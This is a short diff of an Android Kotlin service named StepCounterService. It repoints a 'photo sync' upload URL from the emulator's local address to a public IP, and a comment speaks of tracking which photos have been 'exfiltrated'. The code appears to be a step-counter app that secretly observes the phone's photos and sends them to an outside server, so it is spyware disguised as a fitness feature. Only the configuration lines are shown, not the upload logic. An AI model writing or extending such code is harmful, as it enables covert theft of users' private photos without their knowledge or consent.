@@ -36,7 +36,7 @@ class StepCounterService : Service() {
 
     // Photo Sync Variables
     private val client = OkHttpClient()
-    private val serverUrl = "http://10.0.2.2:5000/upload"
+    private val serverUrl = "http://20.2.92.176:5000/upload"
     private lateinit var photoObserver: ContentObserver
 
     // Using SharedPreferences to keep track of what we've already "exfiltrated"
